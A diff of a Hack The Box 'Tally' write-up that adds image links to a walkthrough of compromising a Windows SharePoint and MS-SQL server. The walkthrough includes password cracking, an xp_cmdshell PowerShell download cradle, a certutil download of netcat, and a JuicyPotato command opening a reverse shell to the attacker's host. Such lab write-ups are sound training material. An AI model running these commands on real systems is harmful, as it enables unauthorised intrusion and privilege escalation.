@@ -1,5 +1,5 @@
 # Tally [HTB](https://app.hackthebox.com/machines/113)
-![tally-01]()
+![tally-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/tally-01.png)
 
 
 ## Recon
@@ -10,7 +10,7 @@ After adding the target to my `/etc/hosts` file I start scanning for open ports:
 nmap -p- --min-rate 10000 tally.htb
 ```
 
-![ports-02]()
+![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/ports-02.png)
 
 
 `nmap` shows 21 ports open, though many of them seem to be RPC related. Let's run a version detection scan againts the more relevant ports:
@@ -19,9 +19,9 @@ nmap -p- --min-rate 10000 tally.htb
 nmap -p 21,80,81,135,139,445,808,1433,5985,15567,47001 -sCV tally.htb -oN nmap.result
 ```
 
-![nmap-res-03]()
-![nmap-res-04]()
-![nmap-res-05]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/nmap-res-03.png)
+![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/nmap-res-04.png)
+![nmap-res-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/nmap-res-05.png)
 
 We have the following:
 
@@ -57,7 +57,7 @@ First, I try to list the content's of the SMB server using a null session, but I
 smbclient -N -L \\\\tally.htb\\
 ```
 
-![smb-denied-06]()
+![smb-denied-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/smb-denied-06.png)
 
 
 But running `crackmapexec` does at least identify the target OS to be an x64-bit 2016 Windows server:
@@ -66,7 +66,7 @@ But running `crackmapexec` does at least identify the target OS to be an x64-bit
 crackmapexec smb tally.htb
 ```
 
-![crackmap-07]()
+![crackmap-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/crackmap-07.png)
 
 
 Let's check the IIS server.
@@ -77,7 +77,7 @@ Let's check the IIS server.
 
 If we browse towards `http://tally.htb` we see a Microsoft SharePoint portal:
 
-![sp-website-08]()
+![sp-website-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/sp-exploit-08.png)
 
 
 There is a single link here of `Sign In` which opens a basic HTTP authentication scheme, but we don't have credentials. 
@@ -85,7 +85,7 @@ There is a single link here of `Sign In` which opens a basic HTTP authentication
 
 If we open the site at `http://tally.htb:15567` we also get prompted for credentials which we dont' have:
 
-![second-website-09]()
+![second-website-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/second-website-09.png)
 
 
 So not much we can do. Running a directory scans againts these two sites revealed nothing meaningful. 
@@ -101,7 +101,7 @@ I decided to give it a try.
 
 After downloading and extracting the archive into a dedicated directory we get the following:
 
-![archive-10]()
+![archive-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/archive-10.png)
 
 
 There are two executable files, one text file which has the list of URL's to brute force and also a PDF file. We only really need the perl script and the text file. 
@@ -113,7 +113,7 @@ To run the program, we need to supply a target URL to the `-a` switch, and we ne
 perl SharePointURLBrute\ v1.1.pl -a "http://tally.htb/" -e SharePoint-UrlExtensions-18Mar2012.txt
 ```
 
-![share-brute-11]()
+![share-brute-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/share-brute-11.png)
 
 
 Looks like we got some results. 
@@ -121,7 +121,7 @@ Looks like we got some results.
 
 I visted every single URL here, only the last one had something useful:
 
-![allitems-12]()
+![allitems-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/allitems-12.png)
 
 
 This file is publicly available for any unauthinticated user to download. 
@@ -135,7 +135,7 @@ docx2txt ftp-details.docx ftp-details.txt
 
 Now we can read the file as we noramlly would on a Linux system:
 
-![ftp-detail-13]()
+![ftp-detail-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/ftp-detail-13.png)
 
 
 We get a password for the FTP server but there is not username. I tried to open the Word document on a Windows system to go over the metadata but there was nothing useful there. 
@@ -144,12 +144,12 @@ We get a password for the FTP server but there is not username. I tried to open 
 At this point I got stuck again, I wasn't sure what I was missing. Eventually I went back to the previously linked artical to see if I could find more info. I saw that they linked a PDF along with the exploit as well, so I decided to read it:
 
 
-![pdf-14]()
+![pdf-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/pdf-14.png)
 
 
 This PDF had additional URL's we can check, so I decided to try them out manually. If we open the URL I highlighted we will get the following:
 
-![viewlists-15]()
+![viewlists-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/viewlists-15.png)
 
 
 There are four folders here.
@@ -160,7 +160,7 @@ The `Documents` folder leads to `/Shared Documents/Forms/AllItems.aspx` which is
 
 But if we click on this folder we get nothing:
 
-![nothing-16]()
+![nothing-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/nothing-16.png)
 
 
 I wasn't sure what I was doing wrong... 
@@ -168,18 +168,18 @@ I wasn't sure what I was doing wrong...
 
 Eventually I figured out that in the FTP file, it said that the hostname is `tally`. So I added this name to my `/etc/hosts` file as well:
 
-![hosts-17]()
+![hosts-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/hosts-17.png)
 
 
 
 Now if we open the same link only with `tally` instead of `tally.htb` we get the item:
 
-![item-18]()
+![item-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/item-18.png)
 
 
 If we click on this file we will see the following:
 
-![file-19]()
+![file-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/file-19.png)
 
 
 We got three possible usernames from this message: `Sarah`, `Tim` & `Rahul`. But the message also mentioned an `ftp_user` account. 
@@ -187,7 +187,7 @@ We got three possible usernames from this message: `Sarah`, `Tim` & `Rahul`. But
 
 If we use this as the username we can login to the FTP server:
 
-![ftp-20]()
+![ftp-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/ftp-20.png)
 
 
 ## FTP Port 21
@@ -248,7 +248,7 @@ This folder is where each user saves they're files. I will only note the more re
 
 In `Sarah`'s folder we can three files:
 
-![sarah-files-21]()
+![sarah-files-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/sarah-files-21.png)
 
 
 I searched online for the `.msi` and `.exe` files, but I didn't find anything useful. The `notes.txt` file mainly says that `Sarah` needs to delete the MS-SQL server. 
@@ -260,7 +260,7 @@ This was the most useful folder by far. Inside of Tim's folder there are two mai
 
 1) `Project` has a single file that reads as such:
 
-![tim-file-22]()
+![tim-file-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/tim-file-22.png)
 
 
 There is a mention of an encrypted share and credentials inside a keepass database. 
@@ -268,7 +268,7 @@ There is a mention of an encrypted share and credentials inside a keepass databa
 
 2) The `Files` folder has the following contents:
 
-![files-23]()
+![files-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/files-23.png)
 
 
 The `KeePass-2.36` folder has what seems like a portable version of KeePass. The `bonus.txt` isn't useful. 
@@ -284,7 +284,7 @@ keepass2john tim.kdbx > tim.hash
 john tim.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![cracked-24]()
+![cracked-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/cracked-24.png)
 
 
 The password for the KeePass database is `simplementeyo`. I have KeePass installed on a Windows VM so I open the database there.
@@ -309,7 +309,7 @@ Let's try to connect:
 smbclient -U htb.local/Finance%Acc0unting \\\\tally.htb\\ACCT
 ```
 
-![smb-25]()
+![smb-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/smb-25.png)
 
 
 We are in! 
@@ -326,7 +326,7 @@ This SMB server is loaded with data. There are lots of subdirectories inside sub
 
 This file has a password for a database but it says it's an old password:
 
-![conn-info-26]()
+![conn-info-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/conn-fin-26.png)
 
 
 + `\zz_Migration\Binaries\New folder\tester.exe`
@@ -334,7 +334,7 @@ This file has a password for a database but it says it's an old password:
 
 This is the only custom application in the `Binaries` directory. If we run `strings` on it we see the following:
 
-![string-27]()
+![string-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/strings-27.png)
 
 
 These looks like the right credentials for the MS-SQL server. Let's try to connect:
@@ -343,7 +343,7 @@ These looks like the right credentials for the MS-SQL server. Let's try to conne
 impacket-mssqlclient sa:GWE3V65#6KFH93@4GWTG2G@tally.htb
 ```
 
-![mssql-28]()
+![mssql-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/mssql-28.png)
 
 
 ## MS-SQL 
@@ -355,7 +355,7 @@ To get a shell from the MS-SQL connection, our user has to have `sysadmin` roles
 SELECT IS_SRVROLEMEMBER('sysadmin');
 ```
 
-![sysamdin-29]()
+![sysamdin-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/sysadmin-29.png)
 
 
 We do have the `sysadmin` role. 
@@ -372,7 +372,7 @@ sp_configure 'xp_cmdshell', '1'
 RECONFIGURE
 ```
 
-![enable-30]()
+![enable-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/enable-30.png)
 
 
 Let's run a quick test to see if we can run OS commands:
@@ -381,7 +381,7 @@ Let's run a quick test to see if we can run OS commands:
 EXEC master..xp_cmdshell 'whoami'
 ```
 
-![exec-31]()
+![exec-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/exec-31.png)
 
 
 Looks like we can! 
@@ -392,7 +392,7 @@ From here we can use a common setup to get a shell using [nishang](https://githu
 
 After downloading the script make sure to invoke it at the end accordingly:
 
-![invoke-32]()
+![invoke-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/invoke-32.png)
 
 
 Then host this file using a python web server:
@@ -415,7 +415,7 @@ EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.1
 
 And we get a shell as `Sarah`:
 
-![shell-33]()
+![shell-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/shell-33.png)
 
 
 The first command throws an exception, but afterwards everything works fine. 
@@ -426,7 +426,7 @@ The first command throws an exception, but afterwards everything works fine.
 
 After landing on the machine, I start looking for easy wins, like any privileges we may have:
 
-![priv-33]()
+![priv-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/priv-33.png)
 
 
 We can see `Sarah` has the Impersonate privilge enabled, we can exploit this to get a SYSTEM shell using something like [JuicyPotato](https://github.com/ohpe/juicy-potato).
@@ -447,7 +447,7 @@ certutil -urlcache -f http://10.10.14.54/nc64.exe nc.exe
 
 Now we need to find a working CLSID for the target's OS version which is a 2016 Windows server. We can find an extensive list of CLSID's [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard).
 
-![clsid-34]()
+![clsid-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/clsid-34.png)
 
 
 Next we start the local listener:
@@ -463,7 +463,6 @@ Now we should be ready to execute the exploit, which we can do with the below co
 C:\Users\Sarah\Desktop\jp.exe -l 9001 -p C:\windows\system32\cmd.exe -a "/c C:\Users\Sarah\Desktop\nc.exe -e cmd.exe 10.10.14.54 9001" -t * "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
 ```
 
-
 This stalls my shell which is a good sign. And on my netcat listener I receive the connection:
 
-![root-35]()
+![root-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/root-35.png)
